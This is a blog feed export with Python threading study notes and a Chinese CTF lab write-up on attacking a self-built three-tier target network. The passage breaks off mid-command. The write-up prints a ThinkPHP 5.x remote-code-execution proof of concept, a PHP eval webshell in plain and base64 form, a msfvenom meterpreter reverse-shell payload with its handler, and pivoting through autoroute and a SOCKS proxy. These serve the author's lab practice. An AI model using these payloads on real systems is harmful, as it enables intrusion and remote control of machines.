class="string">'任务2开始\n'</span>)</span><br><span class="line">    print(<span class="string">'任务2结束\n'</span>)</span><br></pre></td></tr></table></figure><p>输出的一种结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 3_join.py</span></span><br><span class="line">任务1开始</span><br><span class="line">任务2开始</span><br><span class="line">任务2结束</span><br><span class="line">所有任务已完成</span><br><span class="line">任务1结束</span><br></pre></td></tr></table></figure><p>注意这个时候任务1和任务2都没有添加join，也就是说输出的内容是什么完全看谁执行的快，谁先执行完谁就先输出，因此这里的输出结果并不唯一，这种杂乱的输出方式是不能接收的，所以需要使用join来控制。</p><h1 id="0x03-在不同位置使用join-的结果"><a href="#0x03-在不同位置使用join-的结果" class="headerlink" title="0x03 在不同位置使用join()的结果"></a>0x03 在不同位置使用join()的结果</h1><p>如果在任务2开始前只对任务1加入join功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">thread.start()  <span class="comment"># 开始线程1</span></span><br><span class="line">thread.join()  <span class="comment"># 对任务1加入join功能</span></span><br><span class="line">thread2.start() <span class="comment"># 开始线程2</span></span><br><span class="line">print(<span class="string">'所有任务已完成\n'</span>)</span><br></pre></td></tr></table></figure><p>其输出结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 3_join.py</span></span><br><span class="line">任务1开始</span><br><span class="line">任务1结束</span><br><span class="line">任务2开始</span><br><span class="line">任务2结束</span><br><span class="line">所有任务已完成</span><br></pre></td></tr></table></figure><p>可以看到程序会先执行任务1再执行接下来的操作，如果在任务2开始后只对任务1加入join功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">thread.start()  <span class="comment"># 开始线程1</span></span><br><span class="line">thread2.start() <span class="comment"># 开始线程2</span></span><br><span class="line">thread.join()  <span class="comment"># 对任务1加入join功能</span></span><br><span class="line">print(<span class="string">'所有任务已完成\n'</span>)</span><br></pre></td></tr></table></figure><p>其输出结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 3_join.py</span></span><br><span class="line">任务1开始</span><br><span class="line">任务2开始</span><br><span class="line">任务2结束</span><br><span class="line">任务1结束</span><br><span class="line">所有任务已完成</span><br></pre></td></tr></table></figure><p>任务1先于任务2启动，但由于任务2的处理时间较短，因此先于任务1完成，而由于任务1加入了join，因此“所有任务已完成”也在任务1完成后再显示。</p><h1 id="0x04-最终代码及输出结果"><a href="#0x04-最终代码及输出结果" class="headerlink" title="0x04 最终代码及输出结果"></a>0x04 最终代码及输出结果</h1><p>如果只对任务2加入join，同样输出结果就是要先等任务2执行完再执行其他程序，但是为了避免不必要的麻烦，推荐下面这种1221的V型排布，毕竟如果每个线程start()后就加入其join()，那就和单线程无异了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">thread.start()  <span class="comment"># 开始线程1</span></span><br><span class="line">thread2.start() <span class="comment"># 开始线程2</span></span><br><span class="line">thread2.join()  <span class="comment"># 对任务2加入join功能</span></span><br><span class="line">thread.join()  <span class="comment"># 对任务1加入join功能</span></span><br></pre></td></tr></table></figure><p>最终完整代码及输出结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_jobs</span><span class="params">()</span>:</span>  <span class="comment"># 定义第1个线程</span></span><br><span class="line">    print(<span class="string">'任务1开始\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    print(<span class="string">'任务1结束\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_jobs2</span><span class="params">()</span>:</span> <span class="comment"># 定义第2个线程</span></span><br><span class="line">    print(<span class="string">'任务2开始\n'</span>)</span><br><span class="line">    print(<span class="string">'任务2结束\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    thread = threading.Thread(target=thread_jobs,name=<span class="string">'任务1'</span>)  <span class="comment"># 定义线程1</span></span><br><span class="line">    thread2 = threading.Thread(target=thread_jobs2, name=<span class="string">'任务2'</span>)  <span class="comment"># 定义线程2</span></span><br><span class="line">    thread.start()  <span class="comment"># 开始线程1</span></span><br><span class="line">    thread2.start() <span class="comment"># 开始线程2</span></span><br><span class="line">    thread2.join()  <span class="comment"># 对任务2加入join功能</span></span><br><span class="line">    thread.join()  <span class="comment"># 对任务1加入join功能</span></span><br><span class="line">    print(<span class="string">'所有任务已完成\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 3_join.py</span></span><br><span class="line">任务1开始</span><br><span class="line">任务2开始</span><br><span class="line">任务2结束</span><br><span class="line">任务1结束</span><br><span class="line">所有任务已完成</span><br></pre></td></tr></table></figure><blockquote><p>参考文章：<a href="https://morvanzhou.github.io/tutorials/python-basic/threading" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/python-basic/threading</a><br>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes" target="_blank" rel="noopener">https://github.com/teamssix/Python-Threading-study-notes</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;往期内容：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/1901031-202253.html&quot;&gt;1、什么是多线程？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/191101-112015.html&quot;&gt;2、添加线程&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;0x00-不使用join-的结果&quot;&gt;&lt;a href=&quot;#0x00-不使用join-的结果&quot; class=&quot;headerlink&quot; title=&quot;0x00 不使用join()的结果&quot;&gt;&lt;/a&gt;0x00 不使用join()的结果&lt;/h1&gt;&lt;p&gt;首先在上一节的示例基础上进行简单修改&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多线程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【Python Threading 学习笔记】2、添加线程</title>
    <link href="https://www.teamssix.com/year/191101-112015.html"/>
    <id>https://www.teamssix.com/year/191101-112015.html</id>
    <published>2019-11-01T03:20:15.000Z</published>
    <updated>2019-11-02T12:21:46.033Z</updated>
    
    <content type="html"><![CDATA[<p>往期内容：<br><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p>这一节主要学习Threading模块的一些基本操作，如获取线程数，添加线程等。</p><a id="more"></a><p>首先导入Threading模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br></pre></td></tr></table></figure><p>获取已激活的线程数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threading.active_count()</span><br></pre></td></tr></table></figure><p>查看所有线程信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threading.enumerate()</span><br></pre></td></tr></table></figure><p>查看现在正在运行的线程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threading.current_thread()</span><br></pre></td></tr></table></figure><p>添加线程，threading.Thread()接收参数target代表这个线程要完成的任务，需自行定义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_jobs</span><span class="params">()</span>:</span>  <span class="comment"># 定义要添加的线程</span></span><br><span class="line">    print(<span class="string">'已激活的线程数： %s'</span> % threading.active_count())</span><br><span class="line">    print(<span class="string">'所有线程信息： %s'</span> % threading.enumerate())</span><br><span class="line">    print(<span class="string">'正在运行的线程： %s'</span> % threading.current_thread())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    thread = threading.Thread(target=thread_jobs, )  <span class="comment"># 定义线程</span></span><br><span class="line">    thread.start()  <span class="comment"># 开始线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 2_add_thread.py</span></span><br><span class="line">已激活的线程数： 2</span><br><span class="line">所有线程信息： [&lt;_MainThread(MainThread, stopped 16800)&gt;, &lt;Thread(Thread-1, started 20512)&gt;]</span><br><span class="line">正在运行的线程 &lt;Thread(Thread-1, started 20512)&gt;</span><br></pre></td></tr></table></figure><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes" target="_blank" rel="noopener">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<a href="https://morvanzhou.github.io/tutorials/python-basic/threading" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;往期内容：&lt;br&gt;&lt;a href=&quot;https://www.teamssix.com/year/1901031-202253.html&quot;&gt;1、什么是多线程？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这一节主要学习Threading模块的一些基本操作，如获取线程数，添加线程等。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多线程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【Python Threading 学习笔记】1、什么是多线程？</title>
    <link href="https://www.teamssix.com/year/1901031-202253.html"/>
    <id>https://www.teamssix.com/year/1901031-202253.html</id>
    <published>2019-10-31T12:22:53.000Z</published>
    <updated>2019-11-02T12:21:38.866Z</updated>
    
    <content type="html"><![CDATA[<p>多线程类似于同时执行多个不同程序，比如一个很大的数据，直接运行的话可能需要10秒钟才能运行完。</p><a id="more"></a><p>但如果使用Threading或者说使用多线程，我们把数据分成5段，每一段数据都放到一个单独的线程里面运算，所有线程同时开始。</p><p>这就好比原本一个工作只有一个人在做，但现在有了5个人同时在做，很明显可以大大的提高效率，节省时间。</p><p>如果平时有用过IDM下载东西的小伙伴，在下载文件的时候可以打开显示细节，就可以看到多个线程同时下载，传输速度基本能达到本地带宽的最高速度，下图可以很直观的看到多个线程同时下载的过程。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Threading1.gif" alt></p><blockquote><p>参考文章：<a href="https://morvanzhou.github.io/tutorials/python-basic/threading" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;多线程类似于同时执行多个不同程序，比如一个很大的数据，直接运行的话可能需要10秒钟才能运行完。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="多线程" scheme="https://www.teamssix.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【续】CFS三层靶机中的Flag位置及其获取</title>
    <link href="https://www.teamssix.com/year/191021-213828.html"/>
    <id>https://www.teamssix.com/year/191021-213828.html</id>
    <published>2019-10-21T13:38:28.000Z</published>
    <updated>2019-11-02T12:22:53.627Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近写了一篇《CFS三层靶机搭建及其内网渗透》的文章，里面满满的干货，本篇文章需要结合《CFS三层靶机搭建及其内网渗透》一起看，这篇文章可以在本文底部找到阅读链接。</p><a id="more"></a><h1 id="0x01-Target1"><a href="#0x01-Target1" class="headerlink" title="0x01 Target1"></a>0x01 Target1</h1><p>1、系统根目录下</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag1.png" alt></p><p>2、网站根目录下</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag2.png" alt></p><p>3、网站robots.txt文件中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag3.png" alt></p><h1 id="0x02-Target2"><a href="#0x02-Target2" class="headerlink" title="0x02 Target2"></a>0x02 Target2</h1><p>1、系统根目录下</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag4.png" alt></p><p>2、日志文件中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag5.png" alt></p><p>3、passwd文件中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag6.png" alt></p><p>4、crontab文件中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag7.png" alt></p><p>5、网站根目录下</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag8.png" alt></p><p>6、管理后台中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag9.png" alt></p><h1 id="0x03-Target3"><a href="#0x03-Target3" class="headerlink" title="0x03 Target3"></a>0x03 Target3</h1><p>1、通过meterpreter上传Everything工具并安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload ./Everything_64.exe C:</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag10.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag11.png" alt></p><p>2、利用Everything，直接搜索flag文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag12.png" alt></p><p>3、找到两处flag，继续找寻发现计划任务中存在第三处flag</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag13.png" alt></p><p>4、最后一处在事件日志的注册表中被找到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Eventlog</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag14.png" alt></p><blockquote><p>《CFS三层靶机搭建及其内网渗透》文章地址：<br>1、首发地址：<a href="https://www.anquanke.com/post/id/187908" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187908</a><br>2、博客地址：<a href="https://www.teamssix.com/year/191021-211425.html">https://www.teamssix.com/year/191021-211425.html</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近写了一篇《CFS三层靶机搭建及其内网渗透》的文章，里面满满的干货，本篇文章需要结合《CFS三层靶机搭建及其内网渗透》一起看，这篇文章可以在本文底部找到阅读链接。&lt;/p&gt;
    
    </summary>
    
      <category term="实例演示" scheme="https://www.teamssix.com/categories/%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA/"/>
    
    
      <category term="内网渗透" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="CFS" scheme="https://www.teamssix.com/tags/CFS/"/>
    
      <category term="比赛" scheme="https://www.teamssix.com/tags/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>CFS三层靶机搭建及其内网渗透【附靶场环境】</title>
    <link href="https://www.teamssix.com/year/191021-211425.html"/>
    <id>https://www.teamssix.com/year/191021-211425.html</id>
    <published>2019-10-21T13:14:25.000Z</published>
    <updated>2019-11-02T12:23:14.859Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发地址：<a href="https://www.anquanke.com/post/id/187908" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187908</a></p></blockquote><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。</p><a id="more"></a><p>在这三台主机中，每台我都放了多个flag，本文将只讲述每个靶机的攻击过程，对于flag的获取不做讨论，这点需要读者自己动手找到这些flag，如果你想知道自己找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”回复“flag”以获取。</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS1.png" alt><br>图 1</p><p>Vmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS2.png" alt><br>图 2</p><p>如果你想在自己的电脑上搭建此靶场的话，需要先将自己Vmware中的虚拟网络编辑器编辑成图 2的样子，之后将三个靶机的OVA文件导入到自己的VMware中即可，这三个虚拟机的IP地址我都已经手动分配成了图 1的样子。</p><blockquote><p>注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。</p></blockquote><h1 id="0x02-Target1"><a href="#0x02-Target1" class="headerlink" title="0x02 Target1"></a>0x02 Target1</h1><h2 id="a、获取shell"><a href="#a、获取shell" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、先用nmap扫描一下Target1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -T4 -O 192.168.1.11</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-04 05:51 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.11</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 994 filtered ports</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">20/tcp   closed ftp-data</span><br><span class="line">21/tcp   open   ftp</span><br><span class="line">22/tcp   open   ssh</span><br><span class="line">80/tcp   open   http</span><br><span class="line">888/tcp  open   accessbuilder</span><br><span class="line">8888/tcp open   sun-answerbook</span><br><span class="line">MAC Address: 00:0C:29:81:A6:6D (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.97 seconds</span><br></pre></td></tr></table></figure><p>可以看到Target1存在ftp、ssh、http等端口，且是一个Linux的操作系统。</p><p>2、既然存在http服务，那就用浏览器打开看看是个什么<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS3.png" alt><br>3、原来是ThinkPHP 5.X框架，这不禁让我想到18年底爆出的该框架的远程命令执行漏洞，那就先用POC测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS4.png" alt><br>4、成功出现了PHPinfo界面，说明该版本是存在这在漏洞的，接下来就可以直接上工具写入一句话了，当然也可以使用POC写入一句话，不过还是工具方便些<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS5.png" alt><br>5、在工具中命令是可以被执行的，那就getshell吧<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS6.png" alt><br>6、昂~ getshell失败，没关系，直接echo写入一句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['TeamsSix']);?&gt;"</span> &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS7.png" alt><br>7、通过浏览器访问，查看shell.php是否上传成功<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS8.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS9.png" alt><br>8、可以看到shell.php已经被上传上去了，但是提示语法错误，同时蚁剑也返回数据为空，看来一句话上传的有点问题，那就cat查看一下<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS10.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">之前：&lt;?php @eval($_POST[&apos;TeamsSix&apos;]);?&gt;</span><br><span class="line">之后：&lt;?php @eval([&apos;TeamsSix&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p>9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg=="</span> | base64 -d &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS11.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS12.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS13.png" alt><br>10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS14.png" alt></p><h2 id="b、设置代理"><a href="#b、设置代理" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><blockquote><p>注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。</p></blockquote><p>1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ifconfig</span></span><br><span class="line">root@kali:~<span class="comment"># msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS15.png" alt><br>2、在kali中配置运行监听模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole</span></span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">msf5 exploit(multi/handler) &gt; options</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS16.png" alt><br>3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ chmod 777 shell.elf</span><br><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ ./shell.elf</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS17.png" alt><br>4、此时MSF获取到shell，通过meterpreter添加第二层的路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">这一步也可以使用run post/multi/manage/autoroute自动添加路由</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS18.png" alt><br>5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/socks4a</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; <span class="built_in">set</span> srvport 2222</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; 